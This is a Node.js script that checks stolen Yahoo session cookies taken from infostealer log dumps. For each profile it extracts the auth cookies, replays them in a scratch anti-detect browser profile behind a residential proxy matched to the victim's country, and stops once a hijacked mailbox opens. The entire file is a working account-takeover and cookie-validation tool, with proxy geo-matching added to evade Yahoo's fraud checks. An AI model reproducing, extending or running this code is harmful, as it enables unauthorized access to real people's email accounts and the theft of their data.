#!/usr/bin/env node
/**
 * find_valid_yahoo_session.mjs
 *
 * Automate checking Yahoo cookie sessions (stealer dumps) to find one that is
 * still VALID (ALIVE): the Yahoo auth cookies still open the mailbox when
 * replayed through a fresh CloakBrowser profile on a geo-matched proxy.
 *
 * For each profile whose best cookie source carries a full Yahoo auth set
 * (SID, AS, Y, T):
 *   1. package that source's Yahoo cookies into a session JSON
 *   2. import_session.mjs --provider yahoo --delete → recreate cookies in a
 *      fresh scratch CloakBrowser profile on a country-matched proxy, then
 *      navigate to mail.yahoo.com and classify ALIVE / DEAD / CHALLENGED /
 *      CAPTCHA / UNKNOWN (ALIVE = the mailbox rendered a Compose button)
 *   3. stop after --limit (default 10) non-ALIVE verdicts, or immediately on
 *      the first ALIVE.
 *
 * Sequential: bdg runs one attached session at a time; each scratch profile is
 * deleted after its check (--delete) so no leftovers remain.
 *
 * Usage:
 *   node scripts/find_valid_yahoo_session.mjs "<dumpRoot>" \
 *       [--limit N] [--dump-only] [--workdir <dir>] [--json out.json]
 *
 *   --limit N      stop after N non-ALIVE verdicts (default 10)
 *   --dump-only    enumerate full Yahoo sessions but skip the import/check pass
 *   --workdir      temp dir for packaged + result files (default /tmp/bdg-yahoo)
 *   --json out.json write the machine-readable results table to a file
 */

import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { execFileSync } from 'child_process';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const IMPORT = path.join(HERE, 'import_session.mjs');

const argv = process.argv.slice(2);
const flag = (name, def) => {
  const i = argv.indexOf(`--${name}`);
  return i !== -1 && argv[i + 1] ? argv[i + 1] : def;
};
const dump = argv.find((a) => a && !a.startsWith('-'));
const limit = parseInt(flag('limit', '10'), 10) || 10;
const dumpOnly = argv.includes('--dump-only');
const workdir = flag('workdir', '/tmp/bdg-yahoo');
const jsonOut = flag('json', null);
const floppyKey = flag('floppy-key', process.env.FLOPPYDATA_API_KEY || null);

if (!dump || !fs.existsSync(dump)) {
  console.error(`Usage: node scripts/find_valid_yahoo_session.mjs "<dumpRoot>" [--limit N] [--dump-only] [--workdir dir] [--json out.json]`);
  process.exit(1);
}
fs.mkdirSync(path.join(workdir, 'sessions'), { recursive: true });

// --- Yahoo full-session auth set ---
// Yahoo's logged-in account cookies are `Y` + `T` (set only after authentication;
// anonymous visitors carry only A1/A3/GUC/uids). `ySID`/`PH` corroborate but are
// not required. Requiring both Y and T is a reliable "was signed in" gate.
const YAHOO_CORE = ['Y', 'T'];
const YAHOO_DOMAIN = /yahoo/;

function parseNetscape(file) {
  if (!fs.existsSync(file)) return [];
  const out = [];
  for (const raw of fs.readFileSync(file, 'utf8').split('\n')) {
    const t = raw.trim();
    if (!t || t.startsWith('#')) continue;
    const p = t.split('\t');
    if (p.length < 7) continue;
    out.push({ domain: p[0], hostOnly: p[1] !== 'TRUE', path: p[2] ?? '/', secure: p[3] === 'TRUE', expires: Number(p[4]) || 0, name: p[5], value: p.slice(6).join('\t') });
  }
  return out;
}
const isYahoo = (c) => YAHOO_DOMAIN.test(String(c.domain || '')) && /SID|AS|^Y$|^T$|YP|PH|GUC|A3|IMP|IMPRESSION_PROCESSOR|^ap$|^b$|^c$/i.test(c.name);

/** Pick the cookie source with the most Yahoo-core cookies (all 4 required). Returns null if none is full. */
function bestYahooSource(profileDir) {
  const dir = path.join(profileDir, 'Cookies');
  if (!fs.existsSync(dir)) return null;
  let best = null; // {file, cookies, coreCount}
  for (const f of fs.readdirSync(dir)) {
    if (!f.endsWith('.txt')) continue;
    const cookies = parseNetscape(path.join(dir, f));
    const names = new Set(cookies.filter(isYahoo).map((c) => c.name.toUpperCase()));
    const coreCount = YAHOO_CORE.filter((n) => names.has(n)).length;
    if (coreCount === YAHOO_CORE.length) {
      if (!best || best.coreCount <= coreCount) best = { file: f, cookies, coreCount };
    }
  }
  return best;
}

function packYahooCookies(cookies) {
  const dedupe = new Map();
  for (const c of cookies) {
    if (!isYahoo(c)) continue;
    const key = `${c.domain}\u0000${c.path}\u0000${c.name}`;
    const ex = dedupe.get(key);
    if (!ex || (c.expires || 0) > (ex.expires || 0)) {
      dedupe.set(key, { name: c.name, value: c.value, domain: c.domain, path: c.path || '/', expires: c.expires || 0 });
    }
  }
  return [...dedupe.values()].map((c) => ({
    name: c.name, value: c.value, domain: c.domain, path: c.path || '/',
    ...(c.expires > 0 ? { expires: c.expires } : {}),
    httpOnly: true, secure: true,
  }));
}

// --- metadata helpers ---
const TOKEN_RE = / - ([A-Z][A-Z0-9]{15,})_\d{4}_\d{2}_\d{2}T/;
function tokenOf(p) { const m = TOKEN_RE.exec(p); return m ? m[1] : path.basename(p).replace(/[^A-Za-z0-9]/g, '_'); }
function tsOf(p) { const m = /_(\d{4}_\d{2}_\d{2}T\d{2}_\d{2}_\d{2}_\d{6})$/.exec(p); return m ? m[1] : ''; }
function countryOf(p) { const m = TOKEN_RE.exec(p); return m && /^[A-Z]{2}$/.test(m[1].slice(0, 2)) ? m[1].slice(0, 2) : null; }

function lastJsonObject(s) {
  let depth = 0;
  for (let i = s.length - 1; i >= 0; i--) {
    const ch = s[i];
    if (ch === '}') depth++;
    else if (ch === '{') { depth--; if (depth === 0) { try { return JSON.parse(s.slice(i)); } catch { return null; } } }
  }
  return null;
}

// Floppydata geo-matched proxy, cached per country; null → import default (US IPVanish)
const proxyCache = new Map();
async function floppyProxyFor(country) {
  if (proxyCache.has(country)) return proxyCache.get(country);
  let url = null;
  if (floppyKey && country) {
    try {
      const res = await fetch('https://api.floppydata.net/v2/proxy/rotating/connections', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Api-Key': floppyKey },
        body: JSON.stringify({ type: 'residential', country, protocol: 'socks5', rotation: 15, udp: true }),
      });
      const j = await res.json();
      url = (j && j.connection && j.connection.connectionString) || null;
    } catch { url = null; }
  }
  proxyCache.set(country, url);
  return url;
}

// --- 1. enumerate profiles with full Yahoo auth set (newest first) ---
console.error(`Enumerating FULL Yahoo sessions under ${dump}...`);
const profiles = [];
{ const stack = [dump]; while (stack.length) { const dir = stack.pop(); let ents; try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch { continue; } for (const e of ents) { const full = path.join(dir, e.name); if (e.isDirectory()) { if (bestYahooSource(full)) profiles.push(full); stack.push(full); } } } }
profiles.sort((a, b) => tsOf(b).localeCompare(tsOf(a)));
console.error(`${profiles.length} full Yahoo sessions found (newest first).`);
if (dumpOnly) { console.log(JSON.stringify({ full: profiles.length, profiles }, null, 2)); process.exit(0); }

// --- 2 & 3. package + import each until ALIVE or `limit` verdicts ---
const results = [];
for (const profile of profiles) {
  const name = tokenOf(profile);
  const country = countryOf(profile);
  const src = bestYahooSource(profile);
  const sessFile = path.join(workdir, 'sessions', `${name}.json`);
  console.error(`\n=== ${name} ===`);

  const session = { name, capturedAt: new Date(), source: `package-yahoo:${profile}`, sourceFile: src.file, cookies: packYahooCookies(src.cookies) };
  fs.writeFileSync(sessFile, JSON.stringify(session, null, 2));

  const proxy = await floppyProxyFor(country);
  const proxyNote = proxy ? `${country} (floppydata ${proxy.split('@').pop()})` : country ? `${country} -> fallback default` : 'unknown geo -> default';
  console.error(`  source: ${src.file} (${src.cookies.length} cookies, ${YAHOO_CORE.length}/${YAHOO_CORE.length} core) | proxy: ${proxyNote}`);

  let status = 'import_error', detail = '';
  const importArgs = [IMPORT, sessFile, '--provider', 'yahoo', '--delete'];
  if (proxy) importArgs.push('--proxy', proxy);
  try {
    const out = execFileSync('node', importArgs, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout: 300000, maxBuffer: 16 * 1024 * 1024 });
    const m = /(✅ ALIVE|💀 DEAD|⚠️ CHALLENGED|🤖 CAPTCHA|❓ UNKNOWN)\s*:\s*(.+)/.exec(out);
    if (m) { status = m[1].trim().split(' ')[1]; detail = m[2].trim(); }
    else detail = (out.trim().split('\n').slice(-4).join(' ')).slice(0, 150);
  } catch (e) {
    const raw = String(e.stdout || e.stderr || e.message || '');
    const m = /(✅ ALIVE|💀 DEAD|⚠️ CHALLENGED|🤖 CAPTCHA|❓ UNKNOWN)\s*:\s*(.+)/.exec(raw);
    if (m) { status = m[1].trim().split(' ')[1]; detail = m[2].trim(); }
    else detail = (raw.split('\n').filter((l) => l.trim()).slice(-3).join(' ')).slice(0, 200) || 'check failed';
  }
  results.push({ profile, status, detail });
  const icon = { ALIVE: '✅', DEAD: '💀', CHALLENGED: '⚠️', CAPTCHA: '🤖', UNKNOWN: '❓' }[status] || '✘';
  console.error(`  ${icon} ${status}: ${detail}`);

  if (status === 'ALIVE') { console.error('\n✔ VALID (ALIVE) Yahoo session found — stopping.'); break; }
  const nonAlive = results.filter((r) => r.status !== 'ALIVE').length;
  if (nonAlive >= limit) { console.error(`\n⏹ Stopping after ${limit} non-ALIVE verdicts (${results.length} checked).`); break; }
}

// --- summary ---
const counts = {};
for (const r of results) counts[r.status] = (counts[r.status] || 0) + 1;
const alive = results.filter((r) => r.status === 'ALIVE');
console.error(`\n=== Done: ${results.length} checked (limit ${limit}) ===`);
for (const [k, v] of Object.entries(counts)) console.error(`  ${v} ${k}`);
if (alive.length) {
  console.error(`\n✔ VALID YAHOO SESSIONS (${alive.length}):`);
  alive.forEach((r) => console.error(`  ${r.detail}  ${r.profile}`));
} else {
  console.error('\n✘ No valid (ALIVE) Yahoo session found among the checked profiles.');
}
if (jsonOut) {
  fs.writeFileSync(path.resolve(jsonOut), JSON.stringify({ dump, checked: results.length, limit, counts, alive: alive.map((r) => r.profile), results: results.map((r, i) => ({ i: i + 1, ...r })) }, null, 2));
  console.log(`Wrote results → ${path.resolve(jsonOut)}`);
} else {
  console.log(JSON.stringify({ checked: results.length, counts, alive: alive.map((r) => r.profile) }, null, 2));
}